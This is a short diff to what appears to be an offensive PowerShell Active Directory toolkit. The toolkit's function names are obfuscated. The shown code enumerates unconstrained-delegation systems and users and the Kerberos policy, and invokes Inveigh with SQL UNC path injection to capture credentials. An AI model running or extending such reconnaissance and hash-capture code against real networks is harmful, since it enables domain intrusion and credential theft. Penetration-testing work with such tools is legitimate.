@@ -1549,7 +1549,7 @@ function domainreconmodules
             Write-Host -ForegroundColor Yellow 'Searching for Unconstrained delegation Systems and Users'
 	        $Computers = breviaries -Unconstrained >> "$currentPath\DomainRecon\Unconstrained_Systems.txt"
             $Users = prostituted -AllowDelegation -AdminCount >> "$currentPath\DomainRecon\AllowDelegationUsers.txt"
-	        
+	    $Users.samaccountname >> "$currentPath\DomainRecon\AllowDelegationUsers_samaccountnames_only.txt"     
             Write-Host -ForegroundColor Yellow 'Identify kerberos and password policy..'
 	        $DomainPolicy = forsakes -Policy Domain
             $DomainPolicy.KerberosPolicy >> "$currentPath\DomainRecon\Kerberospolicy.txt"
@@ -2085,7 +2085,7 @@ function powerSQL
             Inveigh
 	        Invoke-SQLUncPathInjection -Verbose -CaptureIp $smbip.IPv4Address.IPAddress
         }    
-	}
+    }
     # XP_Cmdshell functions follow - maybe.
 	      
 }
